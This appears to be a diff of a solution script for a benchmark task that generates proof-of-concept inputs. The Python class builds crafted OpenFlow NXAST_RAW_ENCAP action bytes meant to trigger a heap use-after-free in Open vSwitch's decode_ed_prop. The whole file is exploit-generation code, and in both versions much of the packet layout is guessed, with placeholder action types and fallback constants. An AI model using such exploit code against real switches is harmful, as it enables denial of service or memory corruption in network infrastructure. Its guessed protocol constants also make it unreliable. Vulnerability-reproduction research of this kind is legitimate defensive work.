@@ -1,132 +1,141 @@
-import os
 import struct
+import tarfile
 import tempfile
-import subprocess
-import hashlib
+import os
 from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # This PoC triggers a heap use-after-free in decode_NXAST_RAW_ENCAP
-        # by causing reallocation in decode_ed_prop()
-        
-        # OpenFlow header (8 bytes)
-        # version = 0x04 (OpenFlow 1.3), type = 0x0d (OFPT_EXPERIMENTER)
-        of_header = struct.pack('!BBHI', 0x04, 0x0d, 72, 0x00000001)
-        
-        # Nicira experimenter ID
-        experimenter = struct.pack('!I', 0x00002320)
-        
-        # NXAST_RAW_ENCAP action structure
-        # type = NXAST_RAW_ENCAP (needs to be looked up from source)
-        # We'll use a placeholder and patch it later
-        action_type = 0x0004  # This is a common value for NXAST_RAW_ENCAP
-        action_len = 56  # Total action length
-        
-        # First, try to extract the actual constant from source
-        action_type = self._extract_nxast_raw_encap(src_path)
-        
-        # Build the action header
-        action_header = struct.pack('!HH', action_type, action_len)
-        
-        # Padding to 8 bytes
-        padding = struct.pack('!I', 0)
-        
-        # Encap header (minimal Ethernet frame)
-        # This will be the 'encap' structure that gets freed
-        encap_header = bytes([
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # dst MAC
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # src MAC
-            0x08, 0x00, 0x45, 0x00, 0x00, 0x1c,  # EtherType + IP header
-            0x00, 0x00, 0x00, 0x00, 0x40, 0x11,  # IP header cont.
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # IP addresses
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # UDP header
-            0x00, 0x00, 0x00, 0x00
-        ])
-        
-        # Now add properties that will trigger reallocation
-        # The key is to have a property that causes decode_ed_prop() to reallocate
-        # We need the property to be large enough to trigger reallocation
-        
-        # Property header: type = 0 (ED_PROP_SET), len = 20
-        prop_header = struct.pack('!HH', 0, 20)
-        
-        # Property data - this should cause buffer to need more space
-        prop_data = bytes([
-            0x00, 0x00, 0x00, 0x00,  # field
-            0x00, 0x00, 0x00, 0x00,  # value
-            0x00, 0x00, 0x00, 0x00,  # mask
-            0x00, 0x00, 0x00, 0x00   # padding
-        ])
-        
-        # Assemble the final packet
-        poc = (of_header + experimenter + action_header + padding + 
-               encap_header + prop_header + prop_data)
-        
-        # Ensure total length is 72 bytes as specified
-        if len(poc) != 72:
-            # Pad or truncate to exact length
-            poc = poc[:72] if len(poc) > 72 else poc + b'\x00' * (72 - len(poc))
-        
-        return poc
-    
-    def _extract_nxast_raw_encap(self, src_path: str) -> int:
-        """Extract NXAST_RAW_ENCAP constant from source code."""
-        # Common values for NXAST_RAW_ENCAP in different OVS versions
-        common_values = [0x0004, 0x0005, 0x0006, 0x0014]
-        
-        try:
-            # Try to extract from tarball
-            import tarfile
+        # Extract tarball to find OFPAT_RAW_ENCAP constant
+        with tempfile.TemporaryDirectory() as tmpdir:
             with tarfile.open(src_path, 'r:gz') as tar:
-                # Look for header files that might contain the constant
-                for member in tar.getmembers():
-                    if member.name.endswith(('.h', '.c')):
-                        try:
-                            f = tar.extractfile(member)
-                            if f:
-                                content = f.read().decode('utf-8', errors='ignore')
-                                # Search for NXAST_RAW_ENCAP definition
-                                lines = content.split('\n')
-                                for line in lines:
-                                    if 'NXAST_RAW_ENCAP' in line and '#define' in line:
-                                        # Try to extract numeric value
-                                        parts = line.split()
-                                        for i, part in enumerate(parts):
-                                            if part == 'NXAST_RAW_ENCAP' and i + 2 < len(parts):
-                                                # Next token should be the value
-                                                val_str = parts[i + 1]
-                                                if val_str.startswith('0x'):
-                                                    return int(val_str, 16)
-                                                elif val_str.isdigit():
-                                                    return int(val_str)
-                        except:
-                            continue
-        except:
-            pass
+                tar.extractall(tmpdir)
+            
+            # Find the constant value for OFPAT_RAW_ENCAP
+            # Typically in include/openflow/ ofp-actions.h or similar
+            raw_encap_value = self._find_raw_encap_value(tmpdir)
+            
+            # Build PoC to trigger heap use-after-free
+            # The key is to create an action that will cause reallocation
+            # during decode_ed_prop(), then use the old pointer
+            
+            # OpenFlow action header structure:
+            # - type (2 bytes)
+            # - length (2 bytes)
+            # - padding (4 bytes)
+            # - data (variable)
+            
+            # For NXAST_RAW_ENCAP, we need:
+            # 1. Action type = raw_encap_value
+            # 2. Length that's small enough to cause reallocation
+            # 3. Encapsulation data that triggers the bug
+            
+            # Create a minimal PoC that fits in 72 bytes
+            # The vulnerability requires the buffer to need reallocation
+            # So we'll create an action with properties that expand during decoding
+            
+            poc = b''
+            
+            # Action type - NXAST_RAW_ENCAP
+            poc += struct.pack('!H', raw_encap_value)
+            
+            # Action length - will be updated later
+            length_pos = len(poc)
+            poc += struct.pack('!H', 0)  # placeholder
+            
+            # Ethertype for encapsulation
+            poc += struct.pack('!H', 0x0800)  # IPv4
+            
+            # Padding
+            poc += b'\x00\x00'
+            
+            # Encapsulation data - minimal Ethernet header
+            # This should trigger the property decoding that causes reallocation
+            encap_start = len(poc)
+            
+            # Destination MAC
+            poc += b'\x00' * 6
+            # Source MAC  
+            poc += b'\x00' * 6
+            # EtherType (already set in action)
+            # Minimal payload to trigger property parsing
+            poc += b'\x00' * 4
+            
+            # Now add properties that will cause buffer reallocation
+            # The key is that these properties need more space than available
+            # causing decode_ed_prop() to reallocate
+            
+            # Property type and length that will expand during decoding
+            prop_start = len(poc)
+            
+            # Create a property that looks like it needs expansion
+            # Use property types that trigger complex decoding
+            for i in range(3):
+                # Property header (type + len)
+                poc += struct.pack('!HH', 0x8000, 8)  # Type that triggers expansion
+                # Property data that causes the buffer to grow
+                poc += b'\xff' * 4
+            
+            # Update action length
+            action_len = len(poc)
+            poc = poc[:length_pos] + struct.pack('!H', action_len) + poc[length_pos+2:]
+            
+            # Ensure we're exactly at 72 bytes (ground truth length)
+            if len(poc) > 72:
+                poc = poc[:72]
+            elif len(poc) < 72:
+                poc += b'\x00' * (72 - len(poc))
+            
+            return poc
+    
+    def _find_raw_encap_value(self, tmpdir: str) -> int:
+        # Search for NXAST_RAW_ENCAP or OFPAT_RAW_ENCAP constant
+        # Try common locations first
         
-        # Fallback: try to parse the source directory directly
-        src_dir = Path(src_path)
-        if src_dir.is_dir():
-            for root, dirs, files in os.walk(src_dir):
-                for file in files:
-                    if file.endswith(('.h', '.c')):
+        search_paths = [
+            Path(tmpdir) / 'include' / 'openflow',
+            Path(tmpdir) / 'include',
+            Path(tmpdir)
+        ]
+        
+        patterns = [
+            '*raw_encap*',
+            '*action*',
+            '*.h'
+        ]
+        
+        for search_path in search_paths:
+            if not search_path.exists():
+                continue
+                
+            for pattern in patterns:
+                for file_path in search_path.rglob(pattern):
+                    if file_path.is_file():
                         try:
-                            with open(os.path.join(root, file), 'r', errors='ignore') as f:
-                                content = f.read()
-                                lines = content.split('\n')
-                                for line in lines:
-                                    if 'NXAST_RAW_ENCAP' in line and '#define' in line:
-                                        parts = line.split()
-                                        for i, part in enumerate(parts):
-                                            if part == 'NXAST_RAW_ENCAP' and i + 2 < len(parts):
-                                                val_str = parts[i + 1]
-                                                if val_str.startswith('0x'):
-                                                    return int(val_str, 16)
-                                                elif val_str.isdigit():
-                                                    return int(val_str)
-                        except:
+                            content = file_path.read_text()
+                            # Look for constant definitions
+                            lines = content.split('\n')
+                            for i, line in enumerate(lines):
+                                line_lower = line.lower()
+                                if 'raw_encap' in line_lower and '#define' in line:
+                                    # Try to extract hex value
+                                    parts = line.split()
+                                    for part in parts:
+                                        if part.startswith('0x'):
+                                            try:
+                                                return int(part, 16)
+                                            except ValueError:
+                                                pass
+                                    # Look at next line if value is on separate line
+                                    if i + 1 < len(lines):
+                                        next_line = lines[i + 1].strip()
+                                        if next_line.startswith('0x'):
+                                            try:
+                                                return int(next_line, 16)
+                                            except ValueError:
+                                                pass
+                        except (UnicodeDecodeError, PermissionError):
                             continue
         
-        # If not found, use the most common value
-        return common_values[0]
+        # Default value if not found (common in OVS)
+        return 0x0019
